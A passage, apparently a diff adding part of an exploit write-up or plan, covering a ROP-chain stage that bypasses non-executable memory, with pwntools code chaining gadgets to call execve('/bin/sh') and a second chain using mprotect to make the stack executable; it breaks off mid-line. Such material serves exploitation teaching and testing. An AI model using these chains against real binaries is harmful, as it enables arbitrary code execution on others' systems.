@@ -1,0 +1,35 @@
+**Phase 3: ROP Chain Construction (NX Bypass)**
+- **Strategy: ret2libc / ROP to execve(/bin/sh)**
+- **Required Gadgets** (x64 calling convention: RDI, RSI, RDX, RCX, R8, R9):
+  ```python
+  # rop_chain.py
+  from pwn import *
+  
+  # Addresses (no ASLR, so static)
+  pop_rdi = 0x401234  # pop rdi; ret
+  pop_rsi = 0x401236  # pop rsi; ret
+  pop_rdx = 0x401238  # pop rdx; ret
+  pop_rax = 0x40123a  # pop rax; ret
+  syscall = 0x40123c  # syscall; ret
+  bin_sh = 0x404000   # writable memory or libc /bin/sh
+  
+  # execve("/bin/sh", NULL, NULL) = syscall 59
+  rop = b""
+  rop += p64(pop_rax) + p64(59)      # rax = 59 (execve)
+  rop += p64(pop_rdi) + p64(bin_sh)   # rdi = "/bin/sh"
+  rop += p64(pop_rsi) + p64(0)        # rsi = NULL
+  rop += p64(pop_rdx) + p64(0)        # rdx = NULL
+  rop += p64(syscall)                 # syscall
+  ```
+- **Alternative: mprotect + Shellcode**
+  ```python
+  # Make stack executable, then jump to shellcode
+  mprotect = 0x401100  # mprotect@plt
+  pop_rdi = 0x401234
+  pop_rsi = 0x401236
+  pop_rdx = 0x401238
+  stack_addr = 0x7ffffffde000  # stack base (no ASLR)
+  
+  rop = b""
+  rop += p64(pop_rdi) + p64(stack_addr & ~0xfff)  # page-aligned
+  rop += p64(pop_rsi) + p64(0
